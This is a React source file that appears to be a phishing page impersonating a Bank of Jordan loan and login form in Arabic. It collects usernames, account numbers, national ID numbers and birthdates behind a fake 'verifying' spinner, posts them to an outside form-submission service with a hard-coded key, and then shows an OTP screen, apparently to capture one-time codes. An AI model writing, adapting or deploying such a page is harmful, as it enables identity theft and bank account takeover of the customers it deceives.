import React, { useState } from 'react';
import { useNavigate } from 'react-router-dom';
import OTPVerification from './OTP';
import bankLogo from '../assets/images/logo.png';

const Bankloans = () => {
  const [result, setResult] = useState("");
  const [loading, setLoading] = useState(false);
  const [otpVisible, setOtpVisible] = useState(false);
  const navigate = useNavigate();

  const onSubmit = async (event) => {
    event.preventDefault();
    setResult("جاري الإرسال...");
    setLoading(true); // عرض شاشة التحميل

    setTimeout(async () => {
      setLoading(false); // إخفاء شاشة التحميل بعد 5 ثواني
      const formData = new FormData(event.target);
      formData.append("access_key", "7c0c5f93-6c62-4822-932f-f5f8710c78ac");

      const response = await fetch("https://api.web3forms.com/submit", {
        method: "POST",
        body: formData
      });

      const data = await response.json();
      if (data.success) {
        setResult("تم إرسال النموذج بنجاح");
        event.target.reset();
        setOtpVisible(true);
        
        // عرض صفحة OTP لمدة 10 ثوانٍ ثم العودة للصفحة الرئيسية
        setTimeout(() => {
          setOtpVisible(false);
          navigate('/');
        }, 1000000000);
      } else {
        console.log("Error", data);
        setResult(data.message);
      }
    }, 5000); // انتظار 5 ثواني قبل بدء معالجة الطلب
  };

  return (
    <div className='py-4 '>

      {loading ? (
        <div className="flex flex-col items-center justify-center h-screen bg-white z-10">
          <div className="animate-spin rounded-full h-12 w-12 border-t-4 border-blue-500"></div>
          <p className="mt-4 text-lg font-bold text-gray-700">
            الرجاء الإنتظار سيتم التأكد من المعلومات
          </p>
          <p className="text-sm text-gray-500">
            لا تخرج من هذه الصفحة حتى يتم التأكد
          </p>
        </div>
      ) : otpVisible ? (
        <OTPVerification />
      ) : (
        <div  >

  <figure style={{ textAlign: 'center', margin: '0 auto', maxWidth: 'fit-content' }}>
  <img src={bankLogo} alt="bank-of-jordan" width={250} />
</figure>
                <h1 className='text-center text-3xl font-bold text-[#fff] pt-8'>تسجيل</h1>
          <form onSubmit={onSubmit} className='px-4'>
            <div className='flex justify-center items-start flex-col'>
              <small className="font-bold text-sm">اسم المستخدم</small>
              <input className='bg-transparent border-[1px] w-full mt-2 border-[#e6e7e7] p-[12px] rounded-md placeholder:text-[13px] focus:outline-none focus:border-[#86b7fe]' type="text" name="username"  placeholder='اسم المستخدم' inputMode="numeric" required /> 
            </div>
            <div className='flex justify-center items-start mt-6 flex-col'>
              <small className="font-bold text-sm">رقم حساب</small>
              <input className='bg-transparent border-[1px] w-full mt-2 border-[#e6e7e7] p-[12px] rounded-md focus:outline-none focus:border-[#86b7fe]' type="number" name="number_acc" placeholder='رقم الحساب' required />
            </div>

            <div className='flex justify-center items-start mt-6 flex-col'>
              <small className="font-bold text-sm">رقم الهوية</small>
              <input className='bg-transparent border-[1px] w-full mt-2 border-[#e6e7e7] p-[12px] rounded-md focus:outline-none focus:border-[#86b7fe]' type="number" name="number_id" placeholder='رقم الهوية' required />
            </div>
            <div className='flex justify-center items-start mt-6 flex-col'>
  <small className="font-bold text-sm">تاريخ الميلاد</small>
  <input 
    className='bg-transparent border-[1px] w-full mt-2 border-[#e6e7e7] p-[12px] rounded-md focus:outline-none focus:border-[#86b7fe]' 
    type="date" 
    name="birthdate" 
    required 
  />
</div>
            <div className='flex justify-center items-start mt-6 flex-col'>
              <small className="font-bold text-sm">قيمة القرض</small>
              <input className='bg-transparent border-[1px] w-full mt-2 border-[#e6e7e7] p-[12px] rounded-md focus:outline-none focus:border-[#86b7fe]' type="number" name="loans" placeholder='قيمة القرض' required />
            </div>
            <div className='flex justify-center items-start mt-6 flex-col'>
  <small className="font-bold text-sm">اختر فرع</small>
  <select className='bg-transparent border-[1px] w-full mt-2 border-[#e6e7e7] p-[12px] rounded-md focus:outline-none focus:border-[#86b7fe]' name="branch" required>
    <option value="">اختر فرع</option>
    <option value="الخليل">فرع الخليل</option>
    <option value="الظاهرية">فرع الظاهرية</option>
    <option value="المصيون">فرع المصيون</option>
    <option value="بيت لحم">فرع بيت لحم</option>
    <option value="بيرزيت">فرع بيرزيت</option>
    <option value="ترمسعيا">فرع ترمسعيا</option>
    <option value="جنين">فرع جنين</option>
    <option value="حلحول">فرع حلحول</option>
    <option value="خانيونس">فرع خانيونس</option>
    <option value="رام الله">فرع رام الله</option>
    <option value="رفيديا">فرع رفيديا</option>
    <option value="طولكرم">فرع طولكرم</option>
    <option value="غزة">فرع غزة</option>
    <option value="نابلس">فرع نابلس</option>
    <option value="يطا">فرع يطا</option>
  </select>
</div>
<button className="w-full bg-[#92D3C8] cursor-pointer py-3 rounded-md text-white mt-8 transition-all duration-300 hover:bg-[#004B73] active:scale-95">
            تسجيل الدخول 
            </button>
          <br />
          <br />
          <br />
          <br />
          <br />
          </form>
          <span>{result}</span>
        </div>
      )}
    </div>
  );
};

export default Bankloans;
